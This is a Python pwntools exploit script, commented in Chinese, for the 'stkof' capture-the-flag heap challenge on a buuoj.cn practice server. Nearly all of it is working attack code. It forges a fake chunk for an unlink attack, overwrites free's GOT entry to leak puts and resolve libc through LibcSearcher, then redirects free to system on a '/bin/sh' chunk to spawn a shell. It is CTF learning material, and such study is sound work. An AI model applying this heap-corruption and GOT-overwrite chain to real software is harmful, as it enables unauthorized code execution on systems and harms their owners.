from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './stkof'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',27899) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len):
    sl(b'1')
    sl(int2bytes(len))
    # sa(b':',content)

# def show(index):
#     sla(b':',b'4')
#     sla(b':',int2bytes(index))

def edit(index,size,content):
    sl(b'2')
    sl(int2bytes(index))
    sl(int2bytes(size))
    s(content)

def delete(index):
    sl(b'3')
    sl(int2bytes(index))
#unlink
ptr = 0x602140 + 0x10
#经测试，add分配的堆块从ptr+0x8的位置开始，第二个堆块在ptr+0x10的位置
fd = ptr - 0x18
bk = ptr - 0x10
puts_got = elf.got['puts']
free_got = elf.got['free']
puts_plt = elf.plt['puts']

add(0x10) # 1 无用--因为本题未关闭输入输出缓冲区导致第一个块被隔离开，没有作用
add(0x30) # 2 用于伪造fake chunk
add(0x80) # 3 用于和fake chunk合并
add(0x30) # 4 未修改chunk 用于保存 /bin/sh参数

payload = p64(0) + p64(0x30) #fake chunk 大小为0x20
payload += p64(fd) + p64(bk)
payload += b'a'*0x10
payload += p64(0x30) + p64(0x90)
edit(2, len(payload), payload)
delete(3)

payload = b'a'*0x10 + p64(free_got) + p64(puts_got)
#因为ptr-0x08的位置为1号块的地址，所以先用free_got表地址覆盖1号块地址，再用puts_got表覆盖2号块地址
#这里覆盖一号块好理解，因为等下要把free_got覆盖为puts_plt，但是覆盖二号块我一开始没理解
#现在理解了，覆盖二号块是为了给free函数传参，等会free(2)中的2就是2号块的地址，这里就换成puts_got实现leek
edit(2, len(payload), payload)


payload = p64(puts_plt)
#把free_got（原本存放的1号块地址）指向的地址换成puts_plt
edit(1, len(payload), payload)


delete(2)
puts_addr = uu64(ru('\x7f',drop=False)[-6:])
log.success('puts_addr: ',hex(puts_addr))
system_addr,bin_sh_addr = ret2libc(puts_addr,'puts')

payload = p64(system_addr)
#把free_got（原本存放的1号块地址）指向的地址换成system_addr
edit(1, len(payload), payload)

edit(4, 8, b'/bin/sh\x00')
delete(4)


itr()